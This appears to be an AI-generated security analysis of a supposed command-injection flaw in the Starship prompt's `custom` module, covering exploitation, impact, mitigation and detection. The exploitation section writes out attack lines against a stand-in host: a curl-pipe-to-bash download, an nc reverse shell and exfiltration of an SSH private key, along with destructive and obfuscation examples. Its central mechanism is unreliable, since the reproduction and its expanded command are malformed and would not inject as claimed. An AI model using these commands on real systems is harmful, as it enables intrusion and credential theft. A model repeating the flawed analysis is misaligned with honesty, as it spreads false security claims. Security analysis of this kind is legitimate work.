Okay, here's a deep analysis of the specified attack tree path, focusing on the "Unsanitized User Input in `custom` Command" vulnerability within the Starship prompt configuration.

## Deep Analysis: Starship Prompt - Unsanitized User Input in `custom` Command

### 1. Define Objective, Scope, and Methodology

**Objective:**

The primary objective of this deep analysis is to thoroughly understand the "Unsanitized User Input in `custom` Command" vulnerability in Starship, assess its potential impact, identify mitigation strategies, and provide actionable recommendations for developers and users to prevent exploitation.  We aim to go beyond the basic description and explore real-world scenarios, potential bypasses, and long-term security implications.

**Scope:**

This analysis focuses specifically on the following:

*   The `custom` command module within Starship's configuration (`starship.toml`).
*   The use of environment variables within the `command` field of a `custom` module.
*   The lack of input sanitization or validation on these environment variables.
*   The potential for command injection attacks resulting from this vulnerability.
*   The impact on the user's system and potential lateral movement.
*   Mitigation and prevention strategies.

This analysis *does not* cover:

*   Other Starship modules (e.g., `git`, `directory`, etc.) unless they directly interact with the vulnerable `custom` command.
*   Vulnerabilities in the underlying shell (e.g., Bash, Zsh) itself, although we will consider how the shell's behavior influences the attack.
*   Attacks that do not involve command injection through the `custom` command.

**Methodology:**

The analysis will follow these steps:

1.  **Vulnerability Reproduction:**  We will recreate the vulnerability in a controlled environment to confirm its existence and understand the exact mechanics.
2.  **Code Review (Conceptual):** While we don't have direct access to modify Starship's source code, we will conceptually analyze how Starship likely processes the `custom` command and environment variables, based on its documented behavior and the observed vulnerability.
3.  **Exploitation Scenarios:** We will explore various ways an attacker might exploit this vulnerability, considering different shell environments, operating systems, and potential obfuscation techniques.
4.  **Impact Assessment:** We will analyze the potential consequences of successful exploitation, including the level of access gained, data exfiltration possibilities, and potential for persistence.
5.  **Mitigation Strategies:** We will identify and evaluate various methods to prevent or mitigate the vulnerability, including user-side configuration changes, potential Starship code modifications (hypothetical), and general security best practices.
6.  **Detection Techniques:** We will discuss how to detect attempts to exploit this vulnerability, both proactively and reactively.
7.  **Recommendations:** We will provide clear, actionable recommendations for both users and (hypothetically) Starship developers.

### 2. Deep Analysis of Attack Tree Path: 2.1.1 Unsanitized User Input in `custom` Command [CRITICAL]

**2.1.  Vulnerability Reproduction:**

We can reproduce the vulnerability as described in the attack tree:

1.  **Create `starship.toml`:**
    ```toml
    [custom.my_command]
    command = "echo $MY_VAR"
    ```
2.  **Set Environment Variable:**
    ```bash
    export MY_VAR="; whoami"
    ```
3.  **Observe Prompt:**  The Starship prompt will now execute `whoami` and display the output, demonstrating successful command injection.  We can replace `whoami` with more malicious commands.

**2.2. Conceptual Code Review:**

Starship likely performs the following steps (simplified):

1.  **Read Configuration:**  Reads the `starship.toml` file and parses the `[custom.my_command]` section.
2.  **Retrieve Command:**  Gets the value of the `command` field ("echo $MY_VAR").
3.  **Environment Variable Expansion:**  The shell (Bash, Zsh, etc.) expands the `$MY_VAR` variable *before* Starship executes the command.  This is crucial.  Starship doesn't perform the expansion itself; it relies on the shell.
4.  **Command Execution:**  Starship executes the expanded command string using the user's configured shell.  The shell sees the command as `echo ""; whoami"`, which is equivalent to just `whoami`.

The vulnerability lies in the fact that Starship does *not* sanitize or validate the contents of the `command` field *after* the shell has expanded environment variables.  It blindly executes whatever the shell produces.

**2.3. Exploitation Scenarios:**

*   **Basic Command Execution:**  As demonstrated, `whoami`, `ls -la`, `pwd` can be executed.
*   **File Manipulation:**  `echo "malicious content" > ~/.bashrc` could modify the user's shell configuration.  `rm -rf /` (though unlikely to succeed without `sudo`) is a destructive possibility.
*   **Network Access:**  `curl http://attacker.com/malware.sh | bash` could download and execute a remote script.  `nc attacker.com 1234 -e /bin/bash` could establish a reverse shell.
*   **Data Exfiltration:**  `cat ~/.ssh/id_rsa | nc attacker.com 4444` could send the user's private SSH key to the attacker.
*   **Persistence:**  Adding a malicious command to `~/.bashrc`, `~/.zshrc`, or a cron job could ensure the attacker's code runs repeatedly.
*   **Obfuscation:**  Attackers can use various techniques to hide their commands:
    *   **Base64 Encoding:**  `MY_VAR=$(echo "d2hvYW1p" | base64 -d)` (decodes to `whoami`)
    *   **Hex Encoding:**  `MY_VAR=$(echo -e "\x77\x68\x6f\x61\x6d\x69")` (hex representation of `whoami`)
    *   **Character Insertion:**  `MY_VAR=";w`who`am`i"` (the shell will often ignore extra characters within a command)
    *   **Command Substitution within the Variable:** `MY_VAR="; $(echo whoami)"`
*   **Shell-Specific Exploits:**  The specific shell (Bash, Zsh, Fish, etc.) might have its own quirks or features that could be exploited.  For example, some shells might have different ways of handling command substitution or variable expansion.
* **Targeting CI/CD:** If starship is used in CI/CD pipeline, attacker can try to get access to CI/CD secrets.

**2.4. Impact Assessment:**

*   **Severity:** Critical.  This vulnerability allows for arbitrary code execution with the privileges of the user running Starship.
*   **Confidentiality:**  High risk of data exfiltration (SSH keys, API tokens, personal files).
*   **Integrity:**  High risk of system modification (configuration files, installed software).
*   **Availability:**  Medium risk of denial of service (deleting files, crashing the system), but the attacker's goal is usually persistence and data theft, not disruption.
*   **Lateral Movement:**  If the compromised user has access to other systems (e.g., via SSH), the attacker could potentially use those credentials to move laterally within the network.
* **Privilege escalation:** If starship is running with higher privileges, attacker can gain those privileges.

**2.5. Mitigation Strategies:**

*   **User-Side (Recommended):**
    *   **Avoid `custom` commands with unsanitized input:**  This is the most important mitigation.  Do *not* use environment variables directly within the `command` field of a `custom` module without thorough sanitization.
    *   **Use `command` for static commands only:** If you must use a `custom` command, ensure it's a fixed, safe command that doesn't depend on external input.
    *   **Sanitize input (if absolutely necessary):**  If you *must* use dynamic input, write a separate script to sanitize the input *before* it's used in the Starship configuration.  This script should:
        *   Whitelist allowed characters (e.g., alphanumeric characters and a limited set of safe symbols).
        *   Reject any input containing shell metacharacters (`;`, `|`, `&`, `<`, `>`, `` ` ``, `$`, etc.).
        *   Escape any potentially dangerous characters.
        *   Limit the length of the input.
        *   Example (very basic sanitization - needs to be much more robust):
            ```bash
            # In a separate script (e.g., sanitize.sh)
            sanitized_input=$(echo "$1" | tr -cd '[:alnum:]._-')
            echo "$sanitized_input"

            # In starship.toml
            [custom.my_command]
            command = "./sanitize.sh \"$MY_VAR\""
            ```
    *   **Use the `env_var` module carefully:**  Avoid displaying sensitive environment variables in the prompt.  If you must display an environment variable, consider using the `prefix` and `suffix` options to visually distinguish it from other prompt elements.
    * **Use `when` attribute:** Use `when` attribute to execute command only when it is really needed.

*   **Starship (Hypothetical - for developers):**
    *   **Input Sanitization:**  Implement robust input sanitization for the `command` field of `custom` modules.  This should be done *after* environment variable expansion.  A whitelist approach is strongly recommended.
    *   **Safe Execution Context:**  Consider using a more restricted execution context for `custom` commands, perhaps limiting the available shell features or using a sandboxed environment.  This is a complex solution but would provide the highest level of security.
    *   **Warning/Documentation:**  Clearly warn users in the documentation about the dangers of using unsanitized input in `custom` commands.  Provide examples of safe and unsafe configurations.
    *   **Configuration Validation:**  Implement a configuration validator that checks for potentially dangerous patterns in `starship.toml`, such as the use of unsanitized environment variables in `custom` commands.
    * **Deprecate risky features:** Consider deprecation of risky features, if they are not commonly used.

**2.6. Detection Techniques:**

*   **Shell History Monitoring:**  Monitor the user's shell history (`~/.bash_history`, `~/.zsh_history`, etc.) for suspicious commands.  This is a reactive measure, but it can help detect successful exploitation.
*   **Security Auditing Tools:**  Use security auditing tools (e.g., Lynis, OpenSCAP) to scan for insecure configurations and potential vulnerabilities.
*   **System Call Monitoring:**  Use system call monitoring tools (e.g., auditd, Sysdig) to detect unusual or malicious system calls made by Starship or its child processes.
*   **Intrusion Detection Systems (IDS):**  Network-based and host-based intrusion detection systems can be configured to detect patterns of command injection attacks.
*   **Static Analysis of `starship.toml`:**  Regularly review the `starship.toml` file for potentially dangerous configurations.  This can be automated with a script that checks for the use of environment variables in `custom` commands.
* **Dynamic analysis:** Run starship in sandboxed environment and monitor its behavior.

**2.7. Recommendations:**

*   **For Users:**
    *   **Prioritize avoiding unsanitized input in `custom` commands.** This is the single most effective mitigation.
    *   If you *must* use dynamic input, implement robust sanitization using a separate script.
    *   Regularly review your `starship.toml` for potential security issues.
    *   Be aware of the risks of displaying sensitive information in your prompt.

*   **For Starship Developers (Hypothetical):**
    *   Implement robust input sanitization for `custom` commands.
    *   Improve documentation and warnings regarding the security implications of `custom` commands.
    *   Consider adding a configuration validator to detect potentially dangerous patterns.

### 3. Conclusion

The "Unsanitized User Input in `custom` Command" vulnerability in Starship is a serious security risk that can lead to arbitrary code execution.  While Starship itself doesn't directly perform the environment variable expansion, its lack of input sanitization after the shell performs the expansion creates a significant vulnerability.  Users must take proactive steps to avoid using unsanitized input in their `custom` commands, and (hypothetically) Starship developers should prioritize implementing robust input sanitization and security features to protect users from this type of attack. The best approach is a combination of user awareness, secure configuration practices, and (ideally) improvements to the Starship codebase to mitigate the risk.
